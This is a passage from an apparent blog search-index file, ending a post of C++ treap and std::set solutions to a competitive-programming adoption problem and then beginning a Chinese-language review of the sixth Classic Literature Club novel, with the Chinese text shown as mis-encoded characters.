n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="built_in">ins</span>(k,-INF),<span class="built_in">ins</span>(k,INF);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a, b;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            <span class="keyword">if</span>(T[k].size == <span class="number">2</span>) &#123;</span><br><span class="line">                cur=a;<span class="comment">//curï¼šå½“å‰æ˜¯å® ç‰©ç­‰äººè®¤é¢†è¿˜æ˜¯äººåœ¨ç­‰ç€æ¥å—å® ç‰©ï¼ˆçœ‹åŸé¢˜ï¼Œä¸ç„¶è°çœ‹å¾—æ‡‚å•Š= =ï¼‰</span></span><br><span class="line">                <span class="built_in">ins</span>(k,b);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a == cur) <span class="built_in">ins</span>(k,b);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">Catch</span>(b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line"><span class="number">2.</span> setå®ç°(<span class="number">304</span>ms,<span class="number">2.57</span>MB)  </span><br><span class="line">```cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1111111</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="type">int</span> n, ans;</span><br><span class="line">set &lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt;::iterator left=--s.<span class="built_in">lower_bound</span>(x),right=s.<span class="built_in">lower_bound</span>(x);<span class="comment">//lower_boundçš„å®ç°æ˜¯äºŒåˆ†æŸ¥æ‰¾ï¼Œè¿­ä»£å™¨æŒ‡å‘ä¸æ¯”xå°çš„ä¸”æœ€æ¥è¿‘xçš„æ•°çš„ä½ç½®ï¼Œæ‰€ä»¥leftå°±æ˜¯å‰ç»§ï¼Œrightå°±æ˜¯åç»§</span></span><br><span class="line">    <span class="keyword">if</span>(x-*left&lt;=*right-x&amp;&amp;*left!=-INF) &#123;</span><br><span class="line">        ans+=x-*left;</span><br><span class="line">        s.<span class="built_in">erase</span>(left);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ans+=*right-x;</span><br><span class="line">        s.<span class="built_in">erase</span>(right);</span><br><span class="line">    &#125;</span><br><span class="line">    ans%=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">    s.<span class="built_in">insert</span>(-INF),s.<span class="built_in">insert</span>(INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">2</span>) &#123;</span><br><span class="line">            cur=a;</span><br><span class="line">            s.<span class="built_in">insert</span>(b);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a==cur) s.<span class="built_in">insert</span>(b);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">find</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—ç¬¬6éƒ¨ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹è¯»åæ„Ÿâ€¦â€¦å—ï¼Ÿ</title>
      <link href="/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/"/>
      <url>/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€å‡†å¤‡çœ‹ä¹‹å‰ï¼Œæˆ‘ç•™æ„åˆ°è¿™æœ¬ä¹¦ä¸å‰å‡ æœ¬æœ‰äº›è®¸ä¸åŒã€‚è‹±æ–‡çš„å‰¯æ ‡é¢˜æ¶ˆå¤±äº†ã€‚å°é¢çš„é…å›¾æ˜¯å¤©å°ï¼Œæ˜¯ä¸€ç§ç”ŸåŠ¨æ˜æ™°çš„è‰²å½©å§ã€‚å¤©ç©ºä¸å¤©å°æŸ“ä¸Šç»¿è‰²è°ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¤æˆ‘ç•™æ„äº†è®¸ä¹…ã€‚ä¸»è¦è¿˜æ˜¯å°åº•çš„æ–‡å­—ä»¤æˆ‘å¾ˆåœ¨æ„ï¼šä¹‹å‰å‡ æœ¬éƒ½åªæ˜¯åœ¨æ­¤æŠ›å‡ºæ‚¬å¿µ-x2F-ç–‘é—®ï¼Œä»¤è¯»è€…äºä¹¦ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œè¿™é‡Œå´åœ¨åé¢é™„ä¸Šäº†è¿™æ ·çš„æ–‡å­—ï¼šâ€œå…¨ä¹¦åˆ†ä¸ºå…­ä¸ªçŸ­ç¯‡ï¼Œåœ¨å……æ»¡æ´»åŠ›åˆå¸¦ç‚¹è‹¦æ¶©çš„æ•…äº‹é‡Œï¼Œå¤ç±ç ”ç©¶ç¤¾å››åæˆå‘˜çš„è¿‡å»å’Œæœªæ¥ä¹Ÿé€æ¸æ˜æœ—â€¦â€¦â€è¯­æ°”åº”è¯¥å¾ˆå¹³æ·¡å§ï¼Œä½†æ˜¯ä»¿ä½›ä¸€ç›´åœ¨æš—ç¤ºæˆ‘è¿™ä¸€éƒ¨ä¸ç®€å•ã€‚è¿™å¥è¯åœ¨è¯•å›¾ä¼ è¾¾ç€ä»€ä¹ˆå—ï¼Ÿå·²ç»ç¡®å®šäº†å…¨ä¹¦çš„åŸºè°ƒå—ï¼Ÿæˆ‘å¾ˆå¥½å¥‡ã€‚-æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹æ¡ˆä»¶æœ¬èº«ä¸å¤æ‚ã€‚æŠ•ç¥¨çš„ç¥¨æ•°æ¯”äººæ•°å¤šï¼Œäºæ˜¯é‡Œå¿—å‘æŠ˜æœ¨æ±‚åŠ©ã€‚åœ¨2äººçš„æ•£æ­¥ä¸å¯¹è¯ä¸­ï¼ŒçœŸç›¸é€æ¸æµ®å‡ºæ°´é¢ã€‚å›æœ›åŒç³»åˆ—ç¬¬5éƒ¨ã€Šä¸¤äººè·ç¦»çš„æ¦‚ç®—ã€‹ï¼Œå…¨ä¹¦ç”¨æŠ˜æœ¨äºâ€œæ˜Ÿè°·æ¯â€é•¿è·‘ä¸­çš„æ€è€ƒä¸²è”ï¼Œæ­¤å¤„æ‰‹æ³•ä¸å…¶é¢‡ä¸ºç›¸ä¼¼ã€‚å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„æ•…äº‹å¾€å¾€ä¸åœ¨æ¡ˆä»¶æœ¬èº«ã€‚æƒ³æƒ³å°åº•çš„è¯ï¼Œä¸éš¾çŒœåˆ°æ­¤å¤„å†™çš„æ˜¯é‡Œå¿—çš„è½¬å˜ã€‚ç¬¬ä¸‰éƒ¨ã€Šåº“ç‰¹åˆ©äºšèŠ™å¡çš„é¡ºåºã€‹ä¸­ï¼Œé‡Œå¿—æ€»æ˜¯å¿µå¨ç€â€œæ•°æ®åº“æ˜¯å¾—ä¸å‡ºç»“è®ºçš„â€è¿™æ ·çš„è¯ã€‚ï¼ˆé¡ºå¸¦ä¸€æï¼Œç¬¬ä¸‰éƒ¨å¯¹å››äººçš„å½¢è±¡åˆ»ç”»å¾ˆç”ŸåŠ¨ï¼Œä¸ªäººå¾ˆå–œæ¬¢ã€‚ï¼‰ç„¶è€Œä¹‹æ‰€ä»¥ä¸€ç›´å¿µå¨ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å› ä¸ºæœ¬äººä¸ç”˜å¿ƒâ€”â€”å°½ç®¡é‚£æ—¶é‡Œå¿—ä¹Ÿè¯•ç€æ¨ç†ï¼Œä¸è¿‡ä»–å‘ç°è‡ªå·±åšä¸åˆ°ã€‚è€Œåœ¨æ­¤ï¼Œé‡Œå¿—æ˜æ˜¾æ¥å—äº†è‡ªå·±æ²¡æœ‰æŠ˜æœ¨é‚£æ ·çš„æ‰èƒ½çš„äº‹å®ï¼Œæ€æƒ³ä¸Šå·²ç»åšäº†è½¬å˜ï¼Œä»–ä¾æ—§æ˜¯é‚£ä¸ªåœ¨è¡—æœºæ¸¸æˆä¸­è¾“äº†ä¹Ÿç¬‘å¾—ç¿çƒ‚çš„é‡Œå¿—ã€‚ä¸è¿‡é‡Œå¿—å¯¹å…¬å¹³æ­£ä¹‰çš„æ‰§ç€ã€å¯¹è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„äº‹ç‰©çš„åšæŒä»æœªæ”¹å˜ã€‚è‹¥éå¦‚æ­¤ï¼Œä»–ä¾¿ä¸ä¼šä¸ºå­¦å¼Ÿæ‰“æŠ±ä¸å¹³ï¼Œä¾¿ä¸ä¼šå»è¯·æ±‚æŠ˜æœ¨è§£è°œã€‚å˜ä¸ä¸å˜ï¼ŒæŠŠé‡Œå¿—å½¢è±¡åˆ»ç”»çš„æä¸ºé²œæ˜ã€‚è¿™ä¸ªæ•…äº‹çœŸæ­£æƒ³è¦è¡¨è¾¾çš„æ˜¯è¿™æ ·å§ã€‚-æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹ç”¨æ‘©è€¶èŠ±çš„è§†è§’æ¢å¯»æŠ˜æœ¨çš„è¿‡å»â€”â€”æœ‰æ„æ€çš„è§†è§’ã€‚æ—©å·²ç–‘æƒ‘æ‘©è€¶èŠ±ä¹‹å‰ä¸ºä»€ä¹ˆä¼šè®¨åŒæŠ˜æœ¨ï¼Œæœ¬ç¯‡åˆ™è¿›è¡Œäº†è§£ç­”ï¼Œæ¯•ç«Ÿå¤ç±ç ”ç©¶ç¤¾ç³»åˆ—å‘æ¥æ˜¯é‡ç‚¹åœ¨äºæ¡ˆä»¶èƒŒåã€‚ä»–çš„åˆä¸­åŒå­¦ä»¬ä¼šè®¨åŒä»–ä»…ä»…æ˜¯å› ä¸ºä¸€æ¬¡è¯¯ä¼šï¼Œè€ŒæŠ˜æœ¨é€‰æ‹©äº†æ²‰é»˜ã€‚åœ¨æ‘©è€¶èŠ±çš„å¥½å¥‡å¿ƒé©±ä½¿ä¸‹ï¼Œç»ˆäºäº†è§£äº†æŠ˜æœ¨æ‰€ä½œæ‰€ä¸ºçš„åŸå› ã€‚åœ¨æ‘©è€¶èŠ±é“æ­‰ä¹‹åï¼ŒæŠ˜æœ¨çœ‹ä¼¼æ¼«ä¸ç»å¿ƒï¼Œä½†æ˜¯ä¸€å¥â€œæŠ˜æœ¨çš„è§†çº¿æ¸¸ç§»ä¸å®šâ€çš„æå†™å±•ç°äº†ä»–å†…å¿ƒçš„æ·±å—è§¦åŠ¨ã€‚è¿™ä¸€ç¯‡æ•…äº‹åˆ»ç”»äº†æŠ˜æœ¨åšå¥½äº‹ä¸ç•™åçš„â€œè‹±é›„â€å½¢è±¡ï¼Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†æŠ˜æœ¨æœ¬èº«å¹¶ä¸æ¶ˆæã€‚æŠ˜æœ¨éª¨å­é‡Œå’Œé‡Œå¿—æ˜¯ä¸€æ ·çš„ï¼Œåƒåç”°åªæ˜¯å”¤é†’äº†ä»–çš„æ¿€æƒ…ã€‚ä¸ªäººè®¤ä¸ºæ­¤æ–‡æ¶‰åŠåˆ°äº†æ ¡å›­æ¬ºå‡Œï¼Œä»æ—è§‚è€…çš„è§’åº¦å‡ºå‘å±•ç°äº†æ ¡å›­â€œå†·æš´åŠ›â€çš„å¯æ€•ã€‚æ—è§‚è€…ä¸åº”æ—è§‚ã€‚è‹¥ç›´æ¥ä»‹å…¥ä¸å¦¥ï¼Œæš—ä¸­å¸®åŠ©ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•â€”â€”ç±³æ³½ç©—ä¿¡ä¹Ÿè®¸æƒ³ä¼ è¾¾çš„æ˜¯è¿™ä¸ªã€‚ä¸å¾—è§çš„ï¼ŒçœŸçš„åœ¨é•œä¸­å—ï¼Ÿ-æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹æŠ˜æœ¨æ¢æ˜äº†å®é™…ä¸Šä¸å–œæ¬¢ç›´å‡æœºçš„è€å¸ˆåœ¨æŸæ—¥æ—©æ™¨è¯´å‡ºâ€œæˆ‘å–œæ¬¢ç›´å‡æœºâ€çš„ç¼˜ç”±ã€‚çœ‹åˆ°ä¸€åŠçš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººä¾¿éƒ½èƒ½æ¨¡æ¨¡ç³Šç³ŠçŒœåˆ°ç¼˜ç”±äº†ã€‚å½“ç„¶é‡ç‚¹ä¾æ—§ä¸åœ¨æ¡ˆä»¶ä¸Šã€‚æŠ˜æœ¨è¯´å‡ºâ€œæˆ‘å¾ˆå¥½å¥‡â€çš„æ—¶å€™ï¼Œæ— è®ºé‡Œå¿—ã€åƒåç”°ã€æ‘©è€¶èŠ±è¿˜æ˜¯è¯»è€…éƒ½ä¼šå¤§åƒä¸€æƒŠå§ã€‚è¿™åˆ™æ•…äº‹ä¸é•¿ï¼Œåƒæ˜¯ä¸€ç§è¿‡æ¸¡ã€‚ç„¶è€Œè¯´åˆ°è¿‡æ¸¡å°±ä¼šæƒ³åˆ°è½¬å˜â€”â€”èŠ‚èƒ½ä¸»ä¹‰çš„æŠ˜æœ¨å¼€å§‹æ¸´æœ›æœ¬ä¹¦ä¸­æ‰€è¯´çš„â€œç«ç‘°è‰²çš„äººç”Ÿâ€ã€‚æŸç§ç¨‹åº¦ä¸Šï¼ŒæŠ˜æœ¨å·²ç»æ”¾å¼ƒäº†èŠ‚èƒ½ä¸»ä¹‰ã€‚åƒåç”°æ˜¯å¼•å­ï¼Œæ ¹æœ¬åŠ¨åŠ›æ˜¯åŒé‡Œå¿—ä¸€æ ·çš„ã€å†…å¿ƒæ·±å¤„å¯¹æŸäº›ä¸œè¥¿çš„æ‰§ç€å’Œæ¸´æœ›ã€‚æˆ‘ç›¸ä¿¡é‡Œå¿—åœ¨æ•´ä¸ªç³»åˆ—ä¸­æ›´åƒæ˜¯æŠ˜æœ¨çš„çœŸæˆ‘ä¹‹ä½“ç°ã€‚é€šè¿‡ä¸¤äººè¡¨ç°çš„å·®å¼‚ï¼Œä¾¿èƒ½çœ‹å‡ºæŠ˜æœ¨è·ç¦»çœŸæ­£çš„è‡ªæˆ‘è¿˜æœ‰å¤šè¿œã€‚è¿™æ˜¯æˆ‘å¯¹é‡Œå¿—çš„ç†è§£ï¼šæŠ˜æœ¨å†…å¿ƒçš„é•œåƒã€‚-æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹æ‘©è€¶èŠ±çš„è§†è§’ã€‚çœŸç›¸çš„æ­ç¤ºè€…å°±æ˜¯â€œå‡¶æ‰‹â€æœ¬äººï¼Œååˆ†æœ‰è¶£ã€‚æœ¬æ–‡æ¢è®¨äº†ä¸€ä¸ªé—®é¢˜ï¼šä¸ªä½“åœ¨é›†ä½“ä¹‹ä¸­ï¼Œåº”è¯¥ä¸ºäº†é›†ä½“çš„åˆ©ç›Šè€Œç‰ºç‰²è‡ªå·±ï¼Œè¿˜æ˜¯åº”è¯¥ä¸ºäº†è‡ªå·±çš„å‰é€”è€Œæ”¾å¼ƒé›†ä½“ï¼Ÿæ²³å†…å­¦å§è‡ªå·±é€€å‡ºæ¼«ç ”ï¼Œå´å®‰æ’ç¾½ä»æ‹…ä»»ç¤¾é•¿ï¼Œæ€å¯è°“æ”¾ä¸‹ï¼Ÿè€Œå…¶åŠæ‘©è€¶èŠ±é€€å‡ºä¹Ÿæ˜¯ä¸ºäº†æ¼«ç ”ä¸æ‘©è€¶èŠ±çš„åˆ©ç›Šæœ€å¤§åŒ–ã€‚ç°å®ç”Ÿæ´»å¾€å¾€ä¸ä¼šå‡ºç°æ•…äº‹ä¸­æ¼«ç ”å®Œå…¨ä¸¤æåˆ†åŒ–çš„æƒ…å†µã€‚æ— è®ºåšå‡ºä»€ä¹ˆé€‰æ‹©ï¼Œæ€»æœ‰äººè¦å—ä¼¤ã€‚å› æ­¤ï¼Œæˆ‘æ›´å€¾å‘äºéµå¾ªè‡ªå·±çš„æœ¬å¿ƒã€‚æ‘©è€¶èŠ±çš„é€‰æ‹©ä¹Ÿè®¸ä¸ä¸€å®šæ­£ç¡®ï¼Œæ›´æœ‰å¯èƒ½æ ¹æœ¬æ— å¯¹é”™ä¹‹åˆ†ï¼Œä½†å¥¹è‡³å°‘éµä»äº†è‡ªå·±çš„æœ¬å¿ƒã€‚-æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹è¿™åˆ™æ•…äº‹è¯¦ç»†è¯´æ˜äº†æŠ˜æœ¨æˆä¸ºèŠ‚èƒ½ä¸»ä¹‰è€…çš„åŸå› ã€‚æ•…äº‹çš„ç»“å°¾å€ŸæŠ˜æœ¨çš„å§å§ä¹‹å£è¯´äº†è¿™ä¹ˆä¸€å¥è¯ï¼šâ€œä»Šåä½ ä¼šè¿æ¥æ‚ é•¿çš„å‡æœŸï¼Œè¿™æ ·ä¹Ÿå¥½ï¼Œä½ å°±å¥½å¥½ä¼‘æ¯å§ï¼Œæ²¡é—®é¢˜ï¼Œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜ã€‚â€è¿™é‡Œçš„â€œæ‚ é•¿å‡æœŸâ€å…¶å®æ˜¯ä¸€è¯­ä¸‰å…³ï¼Œæ—¢å®æŒ‡æŠ˜æœ¨å³å°†è¿æ¥çš„æ¼«é•¿æš‘å‡ï¼Œä¹Ÿæš—æŒ‡æŠ˜æœ¨ä¹‹åæ¼«æ¼«æ— æœŸçš„èŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ï¼Œæ›´æŒ‡çš„æ˜¯å†…å¿ƒçš„ç¼“æ…¢æ”¹å˜ã€‚â€œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜â€ï¼Œæš—å–»äº†æŠ˜æœ¨å³å°†å˜æˆä¸€ä¸ªèŠ‚èƒ½ä¸»ä¹‰è€…ï¼ŒèŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ä¸­å†…å¿ƒå´å¹¶ä¸åšå®šï¼Œç»ˆå°†è½¬å˜æ€æƒ³ã€‚æ•…äº‹æœ€ååˆåŠ äº†ä¸€å¥ï¼šâ€œä¹Ÿä¼šæœ‰äººæ¥ç»“æŸä½ è¿™æ‚ é•¿çš„å‡æœŸã€‚â€è¯´æ˜æš‘å‡ç»ˆå°†è¿‡å»ï¼ŒèŠ‚èƒ½ä¸»ä¹‰çš„ç”Ÿæ´»å°†ä¸å†ï¼Œå†…å¿ƒæœ€ç»ˆä¹Ÿä¼šå®Œæˆè½¬å˜ï¼Œæ›´åŠ æˆç†Ÿã€‚ç±³æ³½ç©—ä¿¡åˆ»æ„å®‰æ’æŠ˜æœ¨å’Œåƒåç”°äºŒäººåœ¨è¿™ä¸ªæ•…äº‹é‡Œäº’åŠ¨ï¼Œä¼ è¾¾ç€æ‰€è°“çš„â€œæœ‰äººâ€å°±æ˜¯åƒåç”°ï¼Œæœ¬æ–‡æ˜¯å®˜æ–¹å‘ç³–çš„é“ºå«ä¹‹ä¸€ã€‚-æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹ä¸ç®€å•çš„ä¸€éƒ¨ä¹¦çš„æœ€åä¸€ç« ï¼Œä¸”æ ‡é¢˜å’Œä¹¦çš„æ ‡é¢˜ç›¸åŒï¼Œæš—ç¤ºç€å…¶åˆ†é‡ä¹‹é‡ã€‚ç±³æ³½ç©—ä¿¡æ›´ä¸ºç”¨å¿ƒåœ°å»åˆ»ç”»äº†äººç‰©å½¢è±¡ã€‚ç¯‡å¹…ä¸Šç¨é•¿ï¼Œæ•…äº‹çš„æ¶æ„å’Œç«‹æ„æ›´æ˜¯é«˜æ˜ï¼Œå…·å¤‡ä¸°å¯Œçš„æˆå‰§æ€§å’Œæ€æƒ³ã€‚å‰é¢å‡ ä¸ªæ•…äº‹éƒ½æ˜¯åœ¨è®²æŠ˜æœ¨ã€ç¦éƒ¨å’Œä¼ŠåŸï¼Œæœ€åä¸€ä¸ªè‡ªç„¶ç•™ç»™äº†åƒåç”°çˆ±ç‘ ã€‚â€œæ¡ˆä»¶â€çš„èµ·å› æ˜¯æœ‰ä¸€å¤©åƒåç”°çš„çˆ¶äº²çªç„¶å‘Šè¯‰å¥¹ä¸ä¸€å®šè¦å†ç»§æ‰¿å®¶ä¸šäº†ã€‚æ¯”å–»ä¸ºä¸€é“é€‰æ‹©é¢˜çš„è¯ï¼Œâ€œä¸å¿…é¡»â€å°±æ„å‘³ç€å³å¯ç”¨é€‰ç»§æ‰¿å®¶ä¸šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ç»§æ‰¿ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çœ‹æ¥è¿™å®æ˜¯ä¸€é“å¼€æ”¾çš„é€åˆ†é¢˜ï¼Œé€‰æ‹©ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œå‡ºè·¯å˜å¤šäº†ï¼Œåº”è¯¥å¼€å¿ƒæ‰å¯¹ï¼Œåœ¨æ—äººçœ‹æ¥åƒåç”°æ ¹æœ¬ä¸å¿…è¿™ä¹ˆçƒ¦æ¼ï¼Œç„¶è€Œåœ¨åƒåç”°çœ¼ä¸­æƒ…å†µå´å¹¶éå¦‚æ­¤ã€‚å› ä¸ºå¥¹ä¸æ˜ç™½è¯¥ä¸è¯¥ç”¨è¿™è¿Ÿæ¥çš„ç¿…è†€å±•ç¿…é£ç¿”ã€‚ä¸ç¦æƒ³è¯´å°è¯´è¯»æ¥æ€»æ˜¯å¼¥æ¼«ç€ä¸€ç§æ·¡æ·¡çš„è‹¦æ¶©ï¼ˆå¦‚åŒå°åº•æ–‡å­—æ‰€è¯´ï¼‰ï¼Œè¿œæ²¡æœ‰åŠ¨ç”»æ¥çš„æ˜å¿«ã€‚ç¬¬ä¸€éƒ¨ã€Šå†°è“ã€‹çš„I-screamå·²ç»ä¸ºæ•´ä¸ªç³»åˆ—å¥ å®šäº†åŸºè°ƒã€‚ç¬¬ä¸€éƒ¨ä¹¦ä¸­åƒåç”°çš„èˆ…èˆ…å…³è°·çº¯æ›¾è¿™æ ·è·Ÿå¹´å¹¼çš„åƒåç”°è§£é‡Šâ€œå†°è“â€ï¼šâ€œæ˜¯è¦å˜åšå¼ºçš„æ„æ€ã€‚å¦‚æœè½¯å¼±çš„è¯ï¼Œæ€»æœ‰ä¸€å¤©ä¼šè¿æ‚²é¸£éƒ½å‘ä¸å‡ºæ¥ã€‚è¿™æ ·çš„è¯ï¼Œå°±ç®—æ´»ç€ï¼Œä¹Ÿåªæ˜¯è¡Œå°¸èµ°è‚‰ã€‚â€ä½œè€…å€Ÿèˆ…èˆ…ä¹‹å£è¯´è¿™æ®µè¯æš—æŒ‡çš„è‡ªç„¶æ˜¯èº«ä¸ºå®¶æ—ç»§æ‰¿äººçš„åƒåç”°çš„æŸç§å‘½è¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¹´å¹¼çš„åƒåç”°åœ¨å¬å®Œèˆ…èˆ…çš„è¿™å¥è¯åå°±å“­äº†ã€‚å¥¹å†…å¿ƒä¸€å®šæ˜¯å¯¹è‡ªå·±â€œç¬¼ä¸­é¸Ÿâ€çš„å‘½è¿åšè¿‡æŸç§æŠ—äº‰çš„ï¼Œä½†å¥¹è®¤ä¸ºè¿™ç§æŠ—äº‰æ— æ³•æ”¹å˜ä»€ä¹ˆï¼Œäºæ˜¯å°±æ­¤æ”¾å¼ƒã€‚ç„¶è€Œæœ‰ä¸€å¤©è¿™ä»¶äº‹çœŸçš„æˆçœŸäº†ï¼Œè¿™ä¸ªæ—¶å€™åƒåç”°æ‰å‘ç°è‡ªå·±å¹¶æ²¡æœ‰ä¸ºæ­¤åšè¿‡ä»»ä½•å‡†å¤‡ï¼Œç”šè‡³è¿è¿™ä»¶äº‹æœ¬èº«æ˜¯ä¸æ˜¯è‡ªå·±çœŸçš„æƒ³è¦çš„ä¹Ÿè¦é‡æ–°æ€è€ƒï¼Œè¿™ä¸ªæ—¶å€™æ‰çœŸæ­£å¼€å§‹æƒ¶æã€‚æŠ˜æœ¨å¯¹è¿™ç§å¿ƒç†æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ¯”å–»ï¼šå¥½æ¯”æœ‰äº›ä¸ä¿¡è€¶ç¨£çš„äººå”±èµæ­Œä¼šè§‰å¾—åˆ«æ‰­ä¸€æ ·ã€‚åŸæœ¬æ²¡æœ‰è‡ªç”±çš„åƒåç”°èƒ½å”±å‡ºæ†§æ†¬è‡ªç”±çš„æ­Œè¯ï¼Œä½†å½“å¥¹çœŸæ­£æœ‰äº†è‡ªç”±ååè€Œå”±ä¸å‡ºæ¥äº†ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼Œå®åˆ™ç¬¦åˆäººç‰©å¿ƒå¢ƒã€‚æ­£å¦‚æ•…äº‹çš„æ ‡é¢˜ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹æ‰€æƒ³ä¼ è¾¾ç»™æˆ‘ä»¬çš„æ„ä¹‰ï¼šç¬¼ä¸­çš„é¸Ÿå„¿ä¼šæ†§æ†¬è‡ªç”±ï¼Œç„¶è€Œæ‰“å¼€é¸Ÿç¬¼åï¼Œå®ƒä»¬å´ä¼šå› è¿Ÿæ¥çš„ç¿…è†€è€Œææƒ§ã€‚å…¶å®ï¼Œæœ¬ä¹¦çš„å¦ä¸€ä¸ªè¯‘åâ€œäº‹åˆ°å¦‚ä»Šæ‰å«æˆ‘é£ç¿”â€æ›´è´´è¿‘åŸæ—¥æ–‡æ 